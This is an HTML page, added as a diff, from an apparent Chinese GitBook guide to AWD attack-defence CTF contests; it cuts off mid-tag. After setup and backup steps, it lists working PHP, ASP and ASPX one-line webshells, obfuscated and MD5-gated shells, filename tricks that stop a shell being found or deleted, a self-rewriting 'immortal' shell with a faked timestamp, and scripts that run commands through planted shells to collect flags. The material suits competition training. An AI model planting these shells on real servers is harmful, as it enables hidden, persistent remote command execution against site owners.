+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >浅谈AWD攻防赛的生存攻略</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <p>&#x6D45;&#x8C08;AWD&#x653B;&#x9632;&#x8D5B;&#x7684;&#x751F;&#x5B58;&#x653B;&#x7565;</p>
+<hr>
+<h1 id="awd-&#x89C4;&#x5219;">AWD &#x89C4;&#x5219;</h1>
+<p>AWD&#xFF1A;Attack With Defence&#xFF0C;&#x5373;&#x653B;&#x9632;&#x5BF9;&#x6297;&#xFF0C;&#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7EF4;&#x62A4;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x4E00;&#x822C;&#x4E24;&#x4E09;&#x53F0;&#xFF0C;&#x89C6;&#x5C0F;&#x7EC4;&#x53C2;&#x8D5B;&#x4EBA;&#x6570;&#x800C;&#x5B9A;&#xFF09;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF08;web&#x5C42;&#x3001;&#x7CFB;&#x7EDF;&#x5C42;&#x3001;&#x4E2D;&#x95F4;&#x4EF6;&#x5C42;&#x7B49;&#xFF09;&#xFF0C;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5F97;&#x5206;&#xFF0C;&#x52A0;&#x56FA;&#x65F6;&#x95F4;&#x6BB5;&#x53EF;&#x81EA;&#x884C;&#x53D1;&#x73B0;&#x6F0F;&#x6D1E;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x52A0;&#x56FA;&#xFF0C;&#x907F;&#x514D;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x653B;&#x51FB;&#x5931;&#x5206;&#x3002;</p>
+<ul>
+<li><p>1.&#x4E00;&#x822C;&#x5206;&#x914D;Web&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x591A;&#x6570;&#x4E3A;Linux&#xFF09;&#x67D0;&#x5904;&#x5B58;&#x5728;flag&#xFF08;&#x4E00;&#x822C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#xFF09;&#xFF1B;</p>
+</li>
+<li><p>2.&#x53EF;&#x80FD;&#x4F1A;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x6D41;&#x91CF;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF08;&#x8F83;&#x5C11;&#x63D0;&#x4F9B;&#xFF09;&#xFF1B;</p>
+</li>
+<li><p>3.flag&#x5728;&#x4E3B;&#x529E;&#x65B9;&#x7684;&#x8BBE;&#x5B9A;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x5237;&#x65B0;&#x4E00;&#x8F6E;&#xFF1B;</p>
+</li>
+<li><p>4.&#x5404;&#x961F;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x521D;&#x59CB;&#x5206;&#x6570;&#xFF1B;</p>
+</li>
+<li><p>5.flag&#x4E00;&#x65E6;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x62FF;&#x8D70;&#xFF0C;&#x8BE5;&#x961F;&#x6263;&#x9664;&#x4E00;&#x5B9A;&#x79EF;&#x5206;&#xFF1B;</p>
+</li>
+<li><p>6.&#x5F97;&#x5230;flag&#x7684;&#x961F;&#x4F0D;&#x52A0;&#x5206;&#xFF1B;</p>
+</li>
+<li><p>7.&#x4E00;&#x822C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#xFF0C;&#x975E;root&#x6743;&#x9650;&#xFF1B;</p>
+</li>
+<li><p>8.&#x4E3B;&#x529E;&#x65B9;&#x4F1A;&#x5BF9;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x670D;&#x52A1;&#x8FDB;&#x884C;check&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x6263;&#x9664;&#x672C;&#x8F6E;flag&#x5206;&#x6570;&#xFF0C;&#x6263;&#x9664;&#x7684;&#x5206;&#x503C;&#x7531;&#x670D;&#x52A1;check&#x6B63;&#x5E38;&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#x3002;</p>
+<p># &#x524D;&#x671F;&#x51C6;&#x5907;</p>
+<p>## SSH&#x767B;&#x5F55;</p>
+<p>&#x53E3;&#x4EE4;&#x767B;&#x5F55;</p>
+<p>&#x547D;&#x4EE4;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A; ssh &#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x540D;@&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;</p>
+<pre class="language-"><code>ssh &#x7528;&#x6237;&#x540D;@ip
+ssh ctf@192.168.182.130
+</code></pre><p>&#x5982;&#x679C;&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x7684;22&#x7AEF;&#x53E3;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; -p &#x9009;&#x9879;&#x6765;&#x4FEE;&#x6539;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x6BD4;&#x5982;&#x8FDE;&#x63A5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;2222&#x7AEF;&#x53E3;</p>
+<pre class="language-"><code>ssh -p &#x6307;&#x5B9A;&#x7AEF;&#x53E3;&#x53F7; &#x7528;&#x6237;&#x540D;@ip
+ssh -p 2222 ctf@192.168.182.130
+</code></pre><p>&#x9664;&#x6B64;&#x4E4B;&#x5916;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Finalshell&#x6216;&#x8005;Xshell&#x7B49;&#x56FE;&#x5F62;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7BA1;&#x7406;&#x8F6F;&#x4EF6;</p>
+</li>
+</ul>
+<p><strong>&#x5BC6;&#x94A5;&#x767B;&#x5F55;</strong>
+&#x7528;id_rsa&#x7528;&#x4E8E;&#x767B;&#x9646;&#x9776;&#x673A;&#xFF0C;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</p>
+<pre class="language-"><code>sftp -i id_rsa ctf@192.168.182.130
+</code></pre><h2 id="&#x6539;&#x5BC6;&#x7801;">&#x6539;&#x5BC6;&#x7801;</h2>
+<p>&#x5B98;&#x65B9;&#x5728;&#x7ED9;&#x51FA;&#x670D;&#x52A1;&#x5668;&#x5BC6;&#x7801;&#x65F6;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#xFF0C;&#x90A3;&#x5C31;&#x9700;&#x8981;&#x8D76;&#x5FEB;&#x4FEE;&#x6539;&#x81EA;&#x5DF1;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4F46;&#x4E00;&#x822C;&#x4E3B;&#x529E;&#x65B9;&#x7ED9;&#x7684;&#x662F;&#x968F;&#x673A;&#x5BC6;&#x7801;&#x3002;</p>
+<p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;SSH&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#x53E3;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x6539;&#x4E86;&#x90A3;&#x5C31;gg&#x4E86;&#xFF0C;&#x540C;&#x65F6;&#x8981;&#x51C6;&#x5907;&#x597D;&#x6279;&#x91CF;&#x811A;&#x672C;&#xFF0C;&#x4E00;&#x65E6;&#x662F;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x3002;</p>
+<p>SSH&#x5BC6;&#x7801;&#x4FEE;&#x6539;:</p>
+<pre class="language-"><code>passwd
+</code></pre><p>mysql&#x5BC6;&#x7801;&#x4FEE;&#x6539;:</p>
+<pre class="language-"><code>#&#x65B9;&#x6CD5;&#x4E00;
+show databases;
+use mysql
+set password for root@localhost = password(&apos;123&apos;);
+#&#x65B9;&#x6CD5;&#x4E8C;
+update user set password = PASSWORD(&apos;&#x9700;&#x8981;&#x66F4;&#x6362;&#x7684;&#x5BC6;&#x7801;&apos;) where user=&apos;root&apos;;
+flush privileges;
+show tables;
+</code></pre><p>Web&#x540E;&#x53F0;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;&#x540E;&#x53F0;&#x53E3;&#x4EE4;&#xFF0C;&#x4E3A;&#x672C;&#x961F;&#x6240;&#x7528;&#xFF0C;&#x8BF4;&#x4E0D;&#x5B9A;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x53F0;getshell&#x3002;</p>
+<h2 id="&#x5907;&#x4EFD;&#x6E90;&#x7801;">&#x5907;&#x4EFD;&#x6E90;&#x7801;</h2>
+<p>&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;(/var/www/html)&#xFF0C;&#x5907;&#x4EFD;&#x7684;&#x76EE;&#x7684;&#x5728;&#x4E8E;&#x4E07;&#x4E00;&#x5BF9;&#x65B9;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x8FDB;&#x5165;&#x4F60;&#x7684;&#x9776;&#x673A;&#x5C06;&#x4F60;&#x7684;WWW&#x4E0B;&#x7684;&#x76EE;&#x5F55;&#x7ED9;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x53CA;&#x65F6;&#x6062;&#x590D;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x6CA1;&#x6709;&#x5907;&#x4EFD;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x5B95;&#x673A;&#x4E86;</p>
+<p>&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#xFF0C;&#x5907;&#x4EFD;&#x7F51;&#x7AD9;&#x76EE;&#x5F55;&#x53CA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E00;&#x822C;&#x5728; /var/www/html &#x76EE;&#x5F55;&#x3002;</p>
+<p>1.&#x76EE;&#x5F55;&#x6253;&#x5305;</p>
+<pre class="language-"><code>&#x6253;&#x5305;
+tar -zcvf archive_name.tar.gz  directory_to_compress
+&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x4F7F;&#x7528;tar&#x547D;&#x4EE4;&#x6253;&#x5305;&#x6587;&#x4EF6;&#x5939;&#xFF0C;.index.php&#xFF08;&#x9690;&#x85CF;&#x7C7B;&#x578B;&#x6587;&#x4EF6;&#xFF09;&#x5C06;&#x4E0D;&#x4F1A;&#x88AB;&#x6253;&#x5305;
+
+&#x5907;&#x4EFD;&#x6574;&#x7AD9;
+cd /var/www &amp;&amp; tar -czvf /tmp/html.tgz html
+# &#x8F6F;&#x8FDE;&#x63A5;&#x5230;&#x4E86;/app
+cd / &amp;&amp; tar -czvf /tmp/app.tgz app
+
+&#x89E3;&#x5305;
+tar -zxvf archive_name.tar.gz
+</code></pre><p>2.&#x5907;&#x4EFD;&#x6570;&#x636E;&#x5E93;</p>
+<ul>
+<li>&#x5907;&#x4EFD;&#x6307;&#x5B9A;&#x7684;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;</li>
+</ul>
+<pre class="language-"><code>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql
+</code></pre><p>&#x65E0; lock tables &#x6743;&#x9650;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</p>
+<pre class="language-"><code>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql
+</code></pre><ul>
+<li>&#x6062;&#x590D;&#x5907;&#x4EFD;&#xFF08;&#x5728; MySQL &#x7EC8;&#x7AEF;&#x4E0B;&#x6267;&#x884C;&#xFF09;</li>
+</ul>
+<pre class="language-"><code>source FILE_PATH
+</code></pre><ul>
+<li>&#x91CD;&#x7F6E; MySQL &#x5BC6;&#x7801;&#xFF08;&#x5728; MySQL &#x7EC8;&#x7AEF;&#x4E0B;&#x6267;&#x884C;&#xFF09;</li>
+</ul>
+<p>&#x65B9;&#x6CD5; 1</p>
+<pre class="language-"><code>set password for &#x7528;&#x6237;&#x540D;@localhost = password(&quot;&#x65B0;&#x5BC6;&#x7801;&quot;)
+</code></pre><p>&#x65B9;&#x6CD5; 2</p>
+<pre class="language-"><code>mysqladmin -u&#x7528;&#x6237;&#x540D; -p&#x65E7;&#x5BC6;&#x7801; password &#x65B0;&#x5BC6;&#x7801;
+</code></pre><p>3.&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;</p>
+<pre class="language-"><code>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
+</code></pre><h2 id="&#x67E5;&#x627E;&#x9884;&#x7559;&#x540E;&#x95E8;">&#x67E5;&#x627E;&#x9884;&#x7559;&#x540E;&#x95E8;</h2>
+<p>&#x7528;D&#x76FE;&#x626B;&#x63CF;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x67E5;&#x627E;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x9776;&#x673A;&#x4E0A;&#x7684;&#x540E;&#x95E8;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x95E8;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x9776;&#x673A;&#x3002;</p>
+<p>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; seay&#x8FDB;&#x884C;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</p>
+<h2 id="&#x7AEF;&#x53E3;&#x626B;&#x63CF;">&#x7AEF;&#x53E3;&#x626B;&#x63CF;</h2>
+<p>&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x662F;&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x9700;&#x8981;&#x77E5;&#x9053;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x653E;&#x4E86;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#xFF0C;&#x4F7F;&#x7528;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x6709;&#x5FA1;&#x5251;&#x9AD8;&#x901F;TCP&#x5168;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x3001;nmap&#x548C;masscan&#x7B49;&#x8FDB;&#x884C;&#x626B;&#x63CF;&#x3002;
+&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5DF1;&#x65B9;&#x9776;&#x673A;&#x5F00;&#x653E;&#x4E86;&#x54EA;&#x4E9B;&#x7AEF;&#x53E3;&#x3002;</p>
+<p>&#x4EE5;&#x4E0B;&#x662F;&#x4E00;&#x4E9B;&#x670D;&#x52A1;&#x7AEF;&#x53E3;&#x7684;&#x6F0F;&#x6D1E;&#xFF1A;
+22&#xFF1A;ssh&#x5F31;&#x53E3;&#x4EE4;
+873&#xFF1A;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;
+3306&#xFF1A;mysql&#x5F31;&#x53E3;&#x4EE4;
+6379&#xFF1A;redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</p>
+<h1 id="&#x653B;&#x51FB;&#x601D;&#x8DEF;">&#x653B;&#x51FB;&#x601D;&#x8DEF;</h1>
+<h2 id="&#x4E3B;&#x673A;&#x53D1;&#x73B0;">&#x4E3B;&#x673A;&#x53D1;&#x73B0;</h2>
+<p>&#x4FE1;&#x606F;&#x6536;&#x96C6;</p>
+<ul>
+<li>nmap&#x3001;Routescan</li>
+<li>Python &#x811A;&#x672C;</li>
+</ul>
+<pre class="language-"><code>import requests
+for x in range(2,255): 
+    url = &quot;http://192.168.1.{}&quot;.format(x) 
+    try: 
+        r = requests.post(url) 
+        print(url) 
+        except: 
+        pass
+</code></pre><h2 id="&#x540E;&#x95E8;&#x5229;&#x7528;">&#x540E;&#x95E8;&#x5229;&#x7528;</h2>
+<p>curl&#x8BFB;flag</p>
+<pre class="language-"><code>C:\Users\admin&gt;curl &quot;http://192.168.182.130:8801/include/shell.php&quot; -d &quot;admin_ccmd=system(&apos;cat /f*&apos;);&quot;
+SL{4a0be463dd85555090f2216795677916d2447242}
+flag{glzjin_wants_a_girl_friend}
+</code></pre><p>&#x811A;&#x672C;</p>
+<pre class="language-"><code>&#x7AEF;&#x53E3;
+#coding=utf-8
+import requests
+url_head=&quot;http://192.168.182.130&quot;   #&#x7F51;&#x6BB5;
+url=&quot;&quot;
+shell_addr=&quot;/upload/url/shell.php&quot; #&#x6728;&#x9A6C;&#x8DEF;&#x5F84;
+passwd=&quot;pass&quot;                   #&#x6728;&#x9A6C;&#x5BC6;&#x7801;
+#port=&quot;80&quot;
+payload = {passwd: &apos;System(\&apos;cat /flag\&apos;);&apos;}
+# find / -name &quot;flag*&quot;
+
+#&#x6E05;&#x7A7A;&#x4E0A;&#x6B21;&#x8BB0;&#x5F55;
+flag=open(&quot;flag.txt&quot;,&quot;w&quot;)
+flag.close()
+
+flag=open(&quot;flag.txt&quot;,&quot;a&quot;)
+
+
+for i in range(8000,8004):
+    url=url_head+&quot;:&quot;+str(i)+shell_addr
+    try:
+        res=requests.post(url,payload)#,timeout=1
+        if res.status_code == requests.codes.ok:
+            result = res.text
+            print (result)
+            flag.write(result+&quot;\n&quot;) 
+        else:
+            print (&quot;shell 404&quot;)
+    except:
+        print (url+&quot; connect shell fail&quot;)
+
+flag.close()
+</code></pre><h2 id="&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;">&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</h2>
+<p>&#x5E38;&#x7528;&#x8BED;&#x8A00;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</p>
+<pre class="language-"><code>php&#xFF1A; <span class="token prolog">&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span> <span class="token attr-name">eval($_GET[&apos;pass&apos;]);</span>
+<span class="token attr-name">asp&#xFF1A;</span>   <span class="token attr-name">&lt;%eval</span> <span class="token attr-name">request</span> <span class="token attr-name">(&quot;pass&quot;)%</span><span class="token punctuation">&gt;</span></span>
+aspx&#xFF1A;  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
+</code></pre><p>&#x8681;&#x5251;&#x8FDE;&#x63A5;get&#x578B;&#x6728;&#x9A6C;&#xFF0C;&#x4E4B;&#x524D;&#x4E00;&#x76F4;&#x4E0D;&#x4F1A;&#x7528;&#x8681;&#x5251;&#x8FDE;&#x63A5;get&#x578B;&#x6728;&#x9A6C;&#xFF0C;&#x8FD9;&#x91CC;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x3002;</p>
+<pre class="language-"><code>&lt;?php eval($_GET[&apos;pass&apos;]);
+
+/shell.php?pass=eval($_POST[1]);
+&#x8FDE;&#x63A5;&#x5BC6;&#x7801;&#xFF1A;1
+</code></pre><h2 id="&#x9690;&#x85CF;shell">&#x9690;&#x85CF;shell</h2>
+<p>shell&#x5F88;&#x5BB9;&#x6613;&#x88AB;&#x53D1;&#x73B0;&#xFF0C;&#x88AB;&#x5220;&#x9664;&#x5C31;gg&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x9690;&#x85CF;shell&#x6216;&#x4F7F;shell&#x65E0;&#x6CD5;&#x88AB;&#x5220;&#x9664;</p>
+<p><strong>1.&#x628A;shell.php&#x547D;&#x540D;&#x4E3A;.shell.php</strong></p>
+<p>.shell.php&#x5728;&#x6267;&#x884C;ls&#x65F6;&#x65E0;&#x6CD5;&#x88AB;&#x67E5;&#x770B;&#x5230;&#xFF0C;&#x642D;&#x914D;ls&#x7684;&#x53C2;&#x6570;&#x624D;&#x80FD;&#x88AB;&#x53D1;&#x73B0;
+&#x5B8C;&#x6574;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</p>
+<pre class="language-"><code>[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php
+[sss@ecs-centos-7 awd]$ ls
+shell.php
+[sss@ecs-centos-7 awd]$ mv shell.php .shell.php
+[sss@ecs-centos-7 awd]$ ls
+[sss@ecs-centos-7 awd]$ ls -al
+&#x603B;&#x7528;&#x91CF; 12
+drwxrwxr-x 2 sss sss 4096 12&#x6708;  29 22:52 .
+drwx------ 4 sss sss 4096 12&#x6708;  29 22:51 ..
+-rw-rw-r-- 1 sss sss    9 12&#x6708;  29 22:52 .shell.php
+</code></pre><p><strong>2.&#x628A;shell.php&#x547D;&#x540D;&#x4E3A;-shell.php</strong>
+&#x4ECE;&#x4E0A;&#x9762;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;ls&#x52A0;&#x53C2;&#x6570;&#x624D;&#x80FD;&#x67E5;&#x770B;&#x5230;shell&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x5199;&#x4E00;&#x4E2A;-shell.php&#x3001;
+&#x547D;&#x4EE4;&#x884C;&#x4F1A;&#x628A;-&#x540E;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x5F53;&#x6210;&#x53C2;&#x6570;&#x6267;&#x884C;&#xFF0C;&#x6267;&#x884C;&#x5373;&#x4F7F;&#x88AB;&#x53D1;&#x73B0;&#xFF0C;&#x4F7F;&#x7528;rm&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x4F1A;&#x88AB;&#x5F53;&#x6210;&#x662F;rm&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x751F;&#x62A5;&#x9519;&#xFF0C;&#x65E0;&#x6CD5;&#x5220;&#x9664;shell&#xFF0C;&#x76EE;&#x7684;&#x4E5F;&#x8FBE;&#x5230;&#x4E86;</p>
+<p>&#x5B8C;&#x6574;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</p>
+<pre class="language-"><code>[sss@ecs-centos-7 awd]$ ls
+-shell.php
+[sss@ecs-centos-7 awd]$ rm -shell.php 
+rm&#xFF1A;&#x65E0;&#x6548;&#x9009;&#x9879; -- s
+Try &apos;rm ./-shell.php&apos; to remove the file &quot;-shell.php&quot;.
+Try &apos;rm --help&apos; for more information.
+[sss@ecs-centos-7 awd]$ rm -rf -shell.php 
+rm&#xFF1A;&#x65E0;&#x6548;&#x9009;&#x9879; -- s
+Try &apos;rm ./-shell.php&apos; to remove the file &quot;-shell.php&quot;.
+Try &apos;rm --help&apos; for more information.
+</code></pre><h2 id="&#x7279;&#x6B8A;&#x7684;shell">&#x7279;&#x6B8A;&#x7684;shell</h2>
+<p>shell1&#xFF1A;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</span>
+</code></pre><p>&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#xFF1A;php?2=assert&#x5BC6;&#x7801;&#x662F;1&#x3002;</p>
+<p>shell2&#xFF1A;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+$a=chr( 96^5);
+$b=chr( 57^79);
+$c=chr( 15^110);
+$d=chr( 58^86);
+$e= &apos;($_REQUEST[C])&apos;;
+@assert($a.$b.$c.$d.$e);
+?&gt;</span>
+</code></pre><p>&#x914D;&#x7F6E;&#x4E3A;?b=))99(rhC(tseuqeR+lave</p>
+<p>shell3&#xFF1A;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+$sF= &quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[&apos;n985de9&apos;];if(isset($s22)){eval($s21($s22));}
+?&gt;</span>
+</code></pre><p>&#x914D;&#x7F6E;&#x586B;n985de9=QGV2YWwoJF9QT1NUWzBdKTs=
+&#x8FDE;&#x63A5;&#x5BC6;&#x7801;:0&#xFF08;&#x96F6;&#xFF09;</p>
+<p>shell4&#xFF1A;MD5&#x6728;&#x9A6C;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+if(md5($_POST[&apos;pass&apos;])==&apos;d8d1a1efe0134e2530f503028a825253&apos;)
+@eval($_POST[&apos;cmd&apos;]);
+?&gt;</span>
+</code></pre><p>shell5&#xFF1A;MD5&#x6728;&#x9A6C;+&#x5229;&#x7528;header
+2021ISCC&#x6CB3;&#x5357;&#x8D5B;&#x533A;&#x7EBF;&#x4E0B;&#x8D5B;&#x5C31;&#x662F;&#x8FD9;&#x79CD;shell&#xFF0C;&#x5F53;&#x65F6;&#x5DEE;&#x70B9;&#x6CA1;&#x770B;&#x51FA;&#x6765;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+echo &apos;hello&apos;;
+if(md5($_POST[&apos;pass&apos;])==&apos;d8d1a1efe0134e2530f503028a825253&apos;)
+if (@$_SERVER[&apos;HTTP_USER_AGENT&apos;] == &apos;flag&apos;){
+$test= &apos;flag&apos;;
+header(&quot;flag:$test&quot;);
+}
+?&gt;</span>
+</code></pre><h2 id="&#x4E0D;&#x6B7B;&#x9A6C;">&#x4E0D;&#x6B7B;&#x9A6C;</h2>
+<p>&#x4E0D;&#x6B7B;&#x9A6C;&#x793A;&#x4F8B;&#xFF1A;</p>
+<pre class="language-"><code><span class="token prolog">&lt;?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = &apos;shell.php&apos;;
+$code = &apos;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;){@eval($_REQUEST[&apos;cmd&apos;]);} ?&gt;</span>&apos;;
+while (1){
+    file_put_contents($file,$code);
+    system(&apos;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&apos;);
+    usleep(5000);
+}
+?&gt;
+
+#passwd=y0range857
+#POST&#x4F20;&#x53C2;&#xFF1A;passwd=y0range857&amp;a=system(&apos;ls&apos;);
+</code></pre><p>&#x5C06;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#xFF0C;&#x4F1A;&#x5728;&#x8BE5;&#x8DEF;&#x5F84;&#x4E0B;&#x4E00;&#x76F4;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x540D;&#x5B57;&#x4E3A;shell2.php&#x7684;shell&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;caidao&#x8F93;&#x5165;<a 